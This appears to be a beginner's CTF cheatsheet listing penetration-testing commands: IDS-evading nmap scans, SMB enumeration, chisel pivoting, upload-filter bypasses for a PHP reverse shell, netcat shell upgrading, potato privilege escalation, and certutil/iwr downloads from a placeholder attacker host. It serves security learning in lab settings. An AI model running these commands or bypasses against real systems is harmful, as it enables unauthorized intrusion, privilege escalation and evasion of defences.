# CTF-Cheatsheet
A rough CTF cheatsheet for beginners.

# Tools
### NMap
This scan is quite aggressive and won't evade an IDS/IPS.
1. nmap -vv -Pn -R -sV -sC -p- **192.x.x.x**

This scan will evade IDS/IPS, you can modify the values accordinly.

2. nmap -vv -Pn -R -sS -f -mtu 8 -F **192.x.x.x**

### SMBMap
Smb shares will be displayed, along with permissions (READ, WRITE, NO ACCESS).
1. smbmap -u "" -p "" -H **192.x.x.x**

### SMBClient
Replace SHARE_NAME with the share identified using smbmap.
1. smbclient \\\\**192.x.x.x**\\SHARE_NAME

### MS-SQL
If you see port 1433 open, then this may be an approach to get inside the windows system.
1. python3 mssqlclient.py **DOMAIN/USERNAME:PASSWORD@IP**

This is another way to connect.

2. sqsh -S **192.x.x.x** -U **192.x.x.x**\\**account** -P **password**

### Chisel
This is a great tool used for pivoting, and can allow you to obtain access to internal webservers (port-forwarding). It is noted if you want to access internal servers, you will need to see what are the current connections that the victim machine is listening for.

**Client**: chisel client *http://**192.x.x.x**/ port*

The server will need to have chisel downloaded onto the victim machine.

**Server**: ./chisel server –port *port* --proxy *http://**192.x.x.x** *

### Searchsploit
If you need an exploit found, this is the first place to check. It is automatically installed on kali and helps you find exploits from the terminal.
1. searchsploit *exploit / service*

Download the file.

2. searchsploit -m *file number*

### HTTPie
This is a great tool to analyse responses, which sometimes helps you see the flag embedded inside the source code.
1. http http://**192.x.x.x**

### Enum4Linux
This tool is great for windows SID finding and username discovery.
1. enum4linux -a **192.x.x.x**

# File Upload Bypass
If you need to upload a reverse shell, like from [PenTest Monkey](https://github.com/pentestmonkey/php-reverse-shell), then you may experience the dashboard preventing you from uploading.
This can be easily fixed by doing either of the following.

**Attempt 1**. Try renaming the extension and then uploading it. If you can upload it, try renaming it from the dashboard.

**Attempt 2**. Try changing the extension from php to php3 or phtml.

**Attempt 3**. Try opening the php reverse shell and adding `GIF89a` to the first line of the file. Then upload. This tricks the server into thinking the file is a GIF.

# File Transfer
There are many ways to transfer files between victim and attacker. The one thing I discovered was that it is easier to have FTP, SMB, and python simple server to handle this.
I strongly recommend searching up how to set up FTP and SMB services, and link it to your kali/parrot desktop for easy transfer.

# Upgrading Shell
To give you more of a familiar terminal interface, if python is installed, you can run this command. You can replace 'python' with any version of python which is installed on the victim system.
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

Once you have given yourself a little graphical update, you can then upgrade to an interactive shell.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ^Z
zsh: suspended  nc -lvnp 1234
                                                                                                                  
┌──(kali㉿kali)-[~/Desktop]
└─$ stty raw -echo;fg                                                                                   
[1]  + continued  nc -lvnp 1234
                               stty sane
```

# Windows Exploitation
### Recommended Scripts
I strongly recommended using the existing scripts for Windows, since it is not easy to develop your own if you aren't familiar with the operating system.
These are my favourites to use:
1. SharpUp.exe (You can find static binaries on github)
2. PowerUp.ps1
3. WinPEAS.exe

### History File
Sometimes credentials maybe stored in the CMD history file on windows.
Location is typically `C:\Users\USERNAME\Appdata\Roaming\Microsoft\Windows\Powershell\PSReadline\...`

### Potato Exploit
I have gathered a basic template from researching and trying out different potato exploits on Windows systems and here is what I have found.
Step 1: If you have the permission 'SeImpersonatePrivilege' then a potato exploit may be possible.
Step 2: Determine which OS version you are currently running. This can be achieved through the use of 'systeminfo' command.
Step 3: Transfer the corresponding potato exploit.
* If machine is >= Windows 10 1809 & Windows Server 2019 -> Try Rogue Potato
* If machine is <= Windows 10 1809 & Windows Server 2019 -> Try Juicy Potato
* If machine is = Windows 10.0.17763 & Microsoft Windows Server 2019 -> Try SweetPotato

**NOTE**: If you see WinRM enabled, then this exploit will not work.

### Unquoted Path
The command mentioned below will find any services with the unquoted path vulnerability.
* `wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """`

# Linux Exploitation
The common exploits for linux are the following.
1. Kernel Exploits
   - Dirty Cow
3. Service misconfigurations
4. Sudo Abusing
5. Cronjob exploitation
6. Buffer Overflow
7. Path Modification
8. Pivoting
9. Outdated Service Exploitation

# Essential Windows Commands
1. net users or net user *username*
2. sc.exe *start/stop* *service-name*
3. type *filename*
4. powershell iwr *http://**192.x.x.x**/filename* -outfile *filename*
5. Certutil.exe -urlcache -f *http://**192.x.x.x**/filename* *filename*

# Essential Linux Commands
1. find / -perm -u=s -type f 2>/dev/null
2. id
3. ls -la
4. nc -lvnp *port* (bread and butter for CTF)

# Key Kali Directories
* **Reverse Shells & Backdoors**: /usr/share/webshells
* **Wordlists**: /usr/share/wordlists

# Top 10 Tips
I am not the best, I am still learning penetration testing methodologies. However, while learning here is what I recommend to help.

1. Enumerate, Enumerate, Enumerate! Nmap is your friend!
2. Get comfortable navigating using the terminal.
3. Check source code of websites.
4. Hidden directories can contain passwords or usernames.
5. Try default passwords for login onto dashboards.
6. Look into SMB, FTP, RDP for any information.
7. Check history files of Windows and Linux.
8. Use automated scripts to help find vulnerabilities (while starting off).
9. Understand cronjobs and what crontab is.
10. Don't use Msfconsole, unless absolutely necessary.

# Must Know Websites
[HackTricks](https://book.hacktricks.xyz/)

[ExploitDB](https://www.exploit-db.com/)

[GTFOBins](https://gtfobins.github.io/)

[Explain Shell](https://explainshell.com/)

[CrackStation](https://crackstation.net/)

[CyberChef](https://gchq.github.io/CyberChef/)

[Hashes](https://hashes.com/en/decrypt/hash)

[ReverseShellGen](https://weibell.github.io/reverse-shell-generator/)
